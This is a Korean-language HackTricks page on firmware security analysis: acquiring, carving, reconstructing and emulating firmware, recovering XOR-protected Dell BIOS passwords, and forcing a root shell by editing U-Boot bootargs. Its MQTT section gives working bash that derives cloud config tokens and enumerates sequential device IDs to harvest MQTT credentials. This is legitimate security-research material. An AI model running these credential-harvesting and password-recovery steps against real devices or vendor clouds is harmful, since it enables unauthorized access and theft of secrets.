# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 자료

노출된 하드웨어 인터페이스를 통한 획득 방법은 [UART 콘솔을 이용한 펌웨어 덤프](../hardware-hacking/uart.md#dumping-firmware-with-uart-console)와 [SPI 플래시 덤프](../hardware-hacking/spi.md#dumping-firmware-from-eeproms)를 참고하세요. 콘솔에 접근하기 전에 부팅 시점의 UART 데이터를 반복해서 캡처하려면 [SCPI로 제어하는 전원 및 오실로스코프 획득](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi)을 참고하세요.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 지원하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 중요한 명령을 사용할 수 있으며, 이를 통해 운영 체제가 시작됩니다. 보안 취약점을 식별하기 위한 핵심 단계는 펌웨어를 검사하고 필요에 따라 수정하는 것입니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 사용 기술을 파악하기 위한 중요한 첫 단계입니다. 이 과정에서는 다음 데이터를 수집합니다.

- CPU 아키텍처와 실행 중인 운영 체제
- 부트로더 세부 정보
- 하드웨어 구성과 데이터시트
- 코드베이스 지표와 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 내역과 규제 인증
- 아키텍처 및 흐름 다이어그램
- 보안 평가와 확인된 취약점

이때 **오픈소스 인텔리전스(OSINT)** 도구가 매우 유용하며, 수동 및 자동화된 검토 절차를 통해 이용 가능한 오픈소스 소프트웨어 구성 요소를 분석하는 것도 도움이 됩니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석 기능을 제공합니다.

## **펌웨어 획득**

펌웨어는 다양한 방법으로 획득할 수 있으며, 방법마다 복잡도가 다릅니다.

- 소스(개발자, 제조업체)에서 **직접 획득**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 쿼리 사용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구를 사용해 **클라우드 스토리지**에 직접 접근
- 중간자 기법으로 **업데이트** 가로채기
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) 또는 **PICit**과 같은 연결을 통해 기기에서 **추출**
- 기기 통신에서 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- 부트로더 또는 네트워크에서 **덤프**
- 다른 방법이 모두 실패한 경우 적절한 하드웨어 도구를 사용해 스토리지 칩을 **분리한 뒤 읽기**

### UART 로그만 있는 경우: 플래시의 U-Boot env를 통해 root shell 강제 실행

UART RX가 무시되고 로그만 출력되는 경우에도, 오프라인에서 **U-Boot 환경 블롭을 편집**하면 init shell을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI 플래시를 덤프합니다:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾고, `bootargs`를 편집해 `init=/bin/sh`를 포함시킨 다음, **blob의 U-Boot env CRC32를 다시 계산합니다**.
3. env 파티션만 다시 플래시하고 재부팅하면 UART에 셸이 나타납니다.

이 방법은 부트로더 셸이 비활성화되어 있지만 외부 플래시 접근을 통해 env 파티션을 쓸 수 있는 임베디드 장치에서 유용합니다.

### Firewall 복사 작업을 통한 보호된 코드 노출

일부 MCU에서는 보호되지 않은 애플리케이션 코드가 보호된 Flash를 직접 읽는 대신 보호 영역 게이트웨이를 호출할 수 있습니다. 애플리케이션 코드 실행 권한을 얻은 후에는 각 게이트웨이 작업을 별도의 메모리 전송 프리미티브로 살펴보세요. Cypherock X1 사례에서 STM32L4 Firewall 호출 게이트는 작업, 외부 `data` 포인터, 길이, 보호된 `address`를 인수로 받았습니다. 쓰기 작업은 Firewall Code를 가리키는 `data` 소스 포인터를 거부하지 못했습니다. 호출자는 해당 코드를 직접 읽을 수 없었지만, 게이트웨이 자체가 코드를 보호된 비휘발성 저장소에 복사할 수 있었고, 허용된 읽기 작업을 통해 이를 노출할 수 있었습니다.<sup>[[15]](#references)</sup>

이 유형의 노출을 재현하려면 해당 읽기 작업이 있는 쓰기 가능한 보호 저장소 페이지를 찾고, 쓰기 소스에 연속된 보호 코드 주소를 설정한 다음, 저장해 둔 바이트를 다시 읽으세요. 쓰기를 반복하기 전에 저장 매체를 확인하세요. 이 사례에서는 Flash였으므로 페이지를 재사용하기 전에 지워야 했습니다. 연구자들은 유효한 Secure Data Storage 내용을 지웠다가 복원하는 루틴을 사용한 뒤, 지갑 데이터를 덮어쓰지 않고 남은 여유 공간에 코드를 저장했습니다. 이를 위해서는 MCU에서 코드 실행이 가능하고 호출 게이트에 도달할 수 있어야 합니다. 인증되지 않은 호스트에서 직접 읽기를 우회하는 방법은 아닙니다.<sup>[[15]](#references)</sup>

복구된 코드는 [펌웨어 업데이트 및 부팅 무결성 신뢰성의 허점](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata)을 드러낼 수 있습니다.<sup>[[15]](#references)</sup>

## 펌웨어 분석

이제 **펌웨어를 확보했으므로**, 펌웨어를 어떻게 다룰지 파악하기 위해 관련 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다음과 같습니다.

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

이 도구들로 별다른 결과를 얻지 못했다면 `binwalk -E <bin>`으로 이미지의 **엔트로피**를 확인하세요. 엔트로피가 낮으면 암호화되었을 가능성이 낮습니다. 엔트로피가 높으면 암호화되었거나 어떤 방식으로 압축되었을 가능성이 높습니다.

또한 다음 도구를 사용해 **펌웨어에 포함된 파일**을 추출할 수 있습니다.

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 파일을 살펴보려면 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수 있습니다.

### 외부 플래시의 원시 디스플레이 에셋

외부 SPI 덤프가 반드시 MCU의 실행 가능한 펌웨어인 것은 아닙니다. Cortex-M 대상의 경우 각 후보 코드 영역의 시작 부분을 장치 메모리 맵과 비교하세요. 정상적인 벡터 테이블은 SRAM의 유효한 스택 포인터와 실행 가능한 메모리의 리셋 핸들러 주소로 시작합니다. 오프셋 0에 벡터 테이블이 없다고 해서 칩 전체에 코드가 없다는 뜻은 아닙니다. 다른 오프셋과 부팅 구성을 살펴보세요. `binwalk`에서 컨테이너를 찾지 못했다면 원시 바이트를 살펴보고, 새 화면을 불러오는 동작과 [디코딩된 SPI 캡처](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer)의 플래시 읽기 주소를 연관 지어 보세요.<sup>[[14]](#references)</sup>

디스플레이 에셋 영역에서는 PNG/JPEG라고 가정하는 대신 가능한 픽셀 포맷과 크기를 시도해 보세요. 인용된 장치는 **80×160 RGB565 little-endian** 프레임을 사용했습니다. 픽셀당 2바이트이므로 프레임 크기는 **25,600 bytes**(25 KiB)이며, 24 kilobits가 아닙니다. 디코딩된 플래시 읽기 주소로 화면 에셋의 오프셋을 찾았습니다. 연구자는 `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`로 준비된 이미지를 변환하고, 원본 덤프에서 크기가 같은 에셋을 교체한 뒤 `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`으로 기록하고 디스플레이에 새 이미지가 표시되는 것을 확인했습니다. 이는 *외부 디스플레이 에셋*을 쓸 수 있음을 보여주는 것이지, MCU 내부 펌웨어를 추출하거나 다시 플래시하는 방법은 아닙니다. 기록하기 전에 원본 덤프를 보관하고 크기, 바이트 순서, 오프셋, 교체 데이터 길이를 확인하세요.<sup>[[14]](#references)</sup>

### 차분 플래시 분석 및 복구 가능한 XOR 시크릿 저장소

펌웨어 설정의 저장 형식이 문서화되어 있지 않다면, 먼저 조건이 같은 플래시 읽기를 여러 번 수행하고, 설정을 **정확히 하나만** 변경한 다음, 칩 전체를 다시 덤프하고 오프셋을 비교하세요. 제어된 값으로 실험을 반복하면 해당 설정과 카운터 및 쓰기 메타데이터를 구분할 수 있습니다. 데이터가 기존 위치가 아닌 새 오프셋에서 바뀐다면 추가 전용 또는 로그 구조 저장소일 가능성이 있습니다. 삭제된 항목이나 tombstone 항목도 페이로드 바이트가 복구 가능하도록 남아 있을 수 있으므로 보존하세요.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

영역을 찾은 후 `binwalk` 같은 도구로 펌웨어 모듈을 추출하고, Ghidra에서 writer/validator를 리버스 엔지니어링하세요. 암호문 패턴만으로 방식을 추측하지 말고 코드에서 필드 경계, 패딩, 키 인덱싱, 키 도출 방식을 확인하세요.<sup>[[12]](#references)</sup>

#### 암호화된 0 패딩에서 키 복구

[XOR 기반 암호화](../../crypto/symmetric/#xor-based-encryption)에서 설명한 것처럼, 알려진 평문을 사용하면 같은 오프셋의 키스트림 바이트를 알아낼 수 있습니다. 반복되는 XOR 키의 모든 인덱스를 0 패딩이 덮는 고정 크기 필드는 특히 노출되기 쉽습니다. `0x00 XOR key_byte = key_byte`이므로 암호화된 패딩에서 해당 키 바이트가 직접 드러납니다. 모든 키 인덱스가 포함되어 있다면 암호문의 끝부분에서 키를 재구성하고, 데이터가 들어 있는 바이트를 복호화하세요.<sup>[[12]](#references)</sup>

Dell의 취약한 DVAR BIOS 비밀번호 형식이 구체적인 예입니다. 32바이트 필드의 바이트 `0`은 평문이고, 바이트 `1..31`에는 반복되는 20바이트 키가 사용됩니다.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

비밀번호 길이가 `L`일 때, XOR 전에는 위치 `L..31`의 값이 0이었습니다. `L <= 12`이면 해당 위치가 모든 키 인덱스를 포함하므로, brute force 없이 전체 키와 비밀번호를 복구할 수 있습니다:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 과거 기록에서 키 추출하기

각 기록을 개별적으로 분석하지 마세요. DVAR 키는 대략 `modified_md5(device_seed || variable_GUID || password[0])`로 파생됩니다. device seed와 GUID는 고정되어 있고, 비밀번호에 따라 달라지는 입력은 평문 첫 바이트뿐입니다. 따라서 장치당 키는 최대 256개이며, 같은 바이트로 시작하는 기록은 같은 키를 공유합니다. 활성 기록과 삭제된 기록을 해당 바이트별로 그룹화하세요. 짧은 과거 기록은 패딩을 통해 전체 키를 유출할 수 있으며, 자체 패딩이 충분하지 않은 현재의 더 긴 기록을 복호화하는 데 사용할 수 있습니다. 따라서 기존 암호문을 완전히 지우지 않고 tombstone 처리하면 비밀번호를 변경했을 때 노출 위험이 커질 수 있습니다.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 도구는 DVAR을 찾고, 후보 기록을 검증하며, 비밀번호를 복구하고, 저장된 원시 데이터/키 바이트를 표시할 수 있습니다. 체크아웃한 소스에서 빌드한 뒤, 검증된 플래시 이미지를 다음과 같이 검사하세요.<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

사용자 지정 파서에서는 레코드 구조, 출력 가능한 문자 제약 조건, 0 패딩 검사, 키 엔트로피, 키가 순환할 때의 일관성을 기준으로 오탐을 거부하세요. 반복 덤프에서 쓰기마다 비트가 드물게 바뀌는 현상이 보이면, 관찰된 마스크를 나열하고 이러한 제약 조건에 따라 수정 후보의 순위를 매기세요. 하지만 휴리스틱으로 얻은 결과를 정확한 복구 결과인 것처럼 제시하지 말고, 모호한 문자는 모호하다고 보고하세요.<sup>[[12]](#references)</sup>

비밀번호 검증 정보는 복호화 가능한 암호문 대신 salt를 적용한 반복 단방향 해시를 저장해야 하며, 로그 구조 저장소에서는 대체된 비밀 데이터를 안전하게 제거해야 합니다.<sup>[[12]](#references)</sup>

### 파일 시스템 가져오기

앞서 주석 처리된 `binwalk -ev <bin>` 같은 도구를 사용했다면 **파일 시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 파일 시스템 종류 이름을 딴 **폴더** 안에 파일 시스템을 추출합니다. 일반적인 종류는 다음과 같습니다. squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일 시스템 수동 추출

경우에 따라 binwalk의 시그니처에 파일 시스템의 **magic byte가 포함되어 있지 않을 수 있습니다**. 이런 경우 binwalk를 사용해 **파일 시스템의 오프셋을 찾고**, 바이너리에서 **압축된 파일 시스템을 추출한 뒤**, 아래 단계에 따라 파일 시스템 종류에 맞게 **수동으로 압축을 해제**하세요.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs 파일 시스템을 carve하기 위해 다음 **dd command**를 실행합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 생성됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일 시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일 시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 분할된 임베디드 root 파일 시스템 재구성

raw eMMC/SSD 덤프에 유효한 파일 시스템 헤더가 있지만 메타데이터 오프셋이 명목상 파티션의 범위를 넘어가더라도, 즉시 손상된 것으로 분류하지 마세요. 임베디드 부팅 코드는 Device Mapper를 사용해 여러 물리적 범위에서 실제 root 장치를 구성할 수 있으므로, GPT 파티션 하나만 추출하면 첫 번째 세그먼트만 얻어집니다.<sup>[[9]](#references)</sup>

#### 전체 미디어 이미지 분류

먼저 획득 작업이 완료되었고, 크기가 안정적이며, 아직 어떤 프로세스도 이미지에 쓰기 작업을 수행하고 있지 않은지 확인합니다. 파일 이름에 시작/끝 주소가 포함되어 있다면 해당 범위를 실제 바이트 수와 비교합니다. GPT를 읽기 전용 모드에서 복구하고 필요한 범위만 연결합니다. 볼륨 그룹 충돌과 의도하지 않은 쓰기가 발생할 수 있으므로 워크스테이션에서 신뢰할 수 없는 물리 볼륨을 대상으로 `vgchange -ay`를 실행하지 마세요.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

원래 init 로직이나 LVM 스택이 전체 이미지를 읽어야 한다면 폐기 가능한 VM을 사용하는 것이 좋습니다. 표준 boot 파티션의 과거 boot 로그가 특히 유용합니다. bootloader가 독점 컨테이너의 오프셋, 구성 요소 길이, 슬롯 선택, 정렬 규칙, 서명 검증 정보를 기록했을 수 있습니다. 이 값을 사용해 내장된 command line/kernel/initramfs를 분리한 다음, 각 출력을 `file`, magic bytes, `binwalk`로 개별 검증하세요. 컨테이너 끝까지 읽으면 initrd, ACPI 객체 또는 서명이 실수로 커널에 추가될 수 있습니다.<sup>[[9]](#references)</sup>

#### boot 시점의 블록 맵 복구

커널의 initramfs를 추출하고 `/init`과 스토리지 라이브러리를 리버스 엔지니어링하세요. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/)에서 `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, 파티션 경로에 대한 문자열 참조를 따라가세요. 그런 다음 활성 A/B 슬롯을 선택하고 테이블을 만드는 코드를 추적하세요. radare2를 시작할 때 유용한 명령은 `r2 -A init`, `afl`, `pdf @ main`, `pdf @ fcn.xxxxx`입니다.<sup>[[9]](#references)</sup>

linear target은 가상 장치의 연속된 범위를 하나 이상의 백업 장치 범위에 매핑합니다. 복구된 두 세그먼트 테이블은 일반적으로 다음과 같은 형태입니다(모든 위치와 길이의 단위는 512바이트 섹터입니다).<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

기계어 연산을 정수 너비, 시프트, 단위 변환까지 정확히 재현하세요. 예를 들어, 다음 식은 바이트 크기를 4-KiB 경계로 내림한 다음에야 512-byte 섹터 단위로 변환합니다. 이를 `p4_bytes // 512`로 바꾸면 파티션이 페이지 정렬되지 않은 경우 선택되는 끝부분이 `p4_bytes % 4096`만큼 이동합니다.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

테이블 순서대로 범위를 제한된 크기의 청크 단위로 복사해 평면 분석 이미지를 재구성하세요. 이렇게 하면 미디어 덤프 전체를 메모리에 로드하지 않아도 됩니다. 호스트 측 mapper 장치도 만들지 않습니다. GPT에서 파생한 오프셋, 역산한 섹터 수, 결과 출력 길이를 각각 별도의 assertion으로 유지하세요.<sup>[[9]](#references)</sup>

#### 손상과 일관된 재구성 오류 구분하기

SquashFS의 경우, `unsquashfs`를 실행하기 전에 `hsqs` 매직을 확인하고 superblock 오프셋 40에 있는 little-endian 64비트 `bytes_used` 필드를 디코딩하세요. 서로 관련 없는 여러 구조에서 추출에 실패하면, 예상 위치 주변의 넓은 범위를 검색하고 강한 구조적 후보를 요구하세요. 예를 들어 압축 해제 가능한 메타데이터 블록, 연속으로 유효한 디렉터리 항목 여러 개, 타당한 inode 필드, inode 수와 일치하는 루트 inode, 또는 유효한 무결성 메타데이터 구조가 해당합니다. 매직 하나만 일치하는 것은 충분하지 않습니다.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

동일한 signed delta로 서로 독립적인 구조가 유효해진다면(예: 디렉터리 메타데이터와 verity 레코드), 바이트 누락보다는 체계적인 세그먼트 시작 위치 오류가 원인일 가능성이 높습니다. orphan recovery를 시도하거나 파일시스템 메타데이터를 패치하기 전에, 역산을 다시 살펴보고 버려진 나머지 값, 부호 처리, 오버플로 또는 섹터/페이지 반올림이 있는지 확인하세요.<sup>[[9]](#references)</sup>

마지막으로 보호 경계를 구분하세요. TPM-sealed LUKS 볼륨은 데이터 기밀성을 보호하는 반면, 서명된 dm-verity 매핑은 루트 파일시스템의 무결성을 보호합니다. 소프트웨어 TPM으로는 원래의 물리적 TPM에 봉인된 키를 복구할 수 없으며, verity 검증을 생략하는 연구용 init으로 수정된 SquashFS를 부팅해도 서명을 위조하거나 dm-verity를 무력화하는 것은 아닙니다.<sup>[[9]](#references)</sup>

## 펌웨어 분석

펌웨어를 확보한 후에는 구조와 잠재적 취약점을 파악하기 위해 세밀하게 분석해야 합니다. 이 과정에는 다양한 도구를 사용해 펌웨어 이미지를 분석하고 유용한 데이터를 추출하는 작업이 포함됩니다.

### 초기 분석 도구

추가 펌웨어 분석 도구와 참고 자료는 [Third-Party Tools and Resources의 펌웨어 섹션](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware)을 참조하세요.

바이너리 파일(이하 `<bin>`)을 초기 검사하기 위한 명령어가 제공됩니다. 이 명령어를 사용하면 파일 유형을 식별하고, 문자열을 추출하고, 바이너리 데이터를 분석하고, 파티션과 파일시스템의 세부 정보를 파악할 수 있습니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **엔트로피**를 확인합니다. 엔트로피가 낮으면 암호화되지 않았을 가능성이 높고, 엔트로피가 높으면 암호화 또는 압축되었을 가능성이 있습니다.

**내장 파일**을 추출하려면 **file-data-carving-recovery-tools** 문서와 파일 검사를 위한 **binvis.io** 같은 도구와 리소스를 권장합니다.

### 파일 시스템 추출

`binwalk -ev <bin>`을 사용하면 보통 파일 시스템을 추출할 수 있으며, 추출된 파일은 대개 파일 시스템 유형에 따라 이름이 지정된 디렉터리(예: squashfs, ubifs)에 저장됩니다. 그러나 매직 바이트가 없어 **binwalk**가 파일 시스템 유형을 인식하지 못하는 경우에는 수동으로 추출해야 합니다. 이때 `binwalk`로 파일 시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일 시스템을 추출합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일시스템 유형(예: squashfs, cpio, jffs2, ubifs)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일시스템 분석

파일시스템을 추출하면 보안 결함을 찾기 시작합니다. 보안이 취약한 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리를 살펴봅니다.

검사할 **주요 위치**와 **항목**은 다음과 같습니다.

- 사용자 자격 증명을 확인하기 위한 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**에 있는 SSL 인증서 및 키
- 잠재적 취약점이 있는 구성 파일 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 기기 웹 서버 및 바이너리

다음 도구는 파일시스템에서 민감한 정보와 취약점을 찾는 데 도움이 됩니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석을 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석을 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 점검

파일시스템에서 발견한 소스 코드와 컴파일된 바이너리는 모두 취약점이 있는지 면밀히 조사해야 합니다. Unix 바이너리용 **checksec.sh** 및 Windows 바이너리용 **PESecurity**와 같은 도구는 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움이 됩니다.

## 파생 URL 토큰을 통한 클라우드 구성 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 클라우드 엔드포인트에서 기기별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어를 분석하다 보면 `<token>`이 하드코딩된 비밀 값을 사용해 기기 ID에서 로컬로 파생된다는 사실을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계에서는 deviceId와 STATIC_KEY를 알아낸 누구나 URL을 재구성해 클라우드 구성을 가져올 수 있으며, 그 결과 평문 MQTT 자격 증명과 topic 접두사가 노출되는 경우가 많습니다.

실제 작업 흐름:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 클라우드 config URL 패턴과 broker 주소를 출력하는 줄을 찾습니다. 예를 들어:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware에서 STATIC_KEY 및 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config 경로("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 생성하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud config 및 MQTT credentials 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 secrets를 추출합니다:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT 및 취약한 topic ACL 악용(있는 경우)

- 복구한 자격 증명을 사용해 유지보수 topic을 구독하고 민감한 이벤트를 찾아봅니다:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 device ID 열거(대규모로, 승인받은 경우)

- 많은 생태계에서는 vendor OUI/product/type 바이트 뒤에 순차적인 접미사가 붙습니다.
- 후보 ID를 순회하고, 토큰을 도출한 뒤, 프로그래밍 방식으로 설정을 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

참고 사항
- 대량 열거를 시도하기 전에 항상 명시적인 허가를 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 시크릿을 복구할 수 있도록 에뮬레이션이나 정적 분석을 우선하세요.

펌웨어를 에뮬레이션하면 장치의 동작이나 개별 프로그램에 대한 **동적 분석**을 수행할 수 있습니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움이 따를 수 있지만, 루트 파일 시스템이나 특정 바이너리를 Raspberry Pi처럼 아키텍처와 엔디언이 일치하는 장치 또는 사전 구축된 가상 머신으로 옮기면 추가 테스트를 진행할 수 있습니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 엔디언과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예시

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령을 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)에는 `qemu-mips`를 사용하고, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM Architecture 에뮬레이션

ARM 바이너리의 경우에도 과정은 비슷하며, 에뮬레이션에는 `qemu-arm` 에뮬레이터를 사용합니다.

### 전체 시스템 에뮬레이션

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 펌웨어 에뮬레이션을 지원해 프로세스를 자동화하고 동적 분석을 돕습니다.

### 에뮬레이션을 위한 분할 및 검증된 루트 파일시스템 재구성

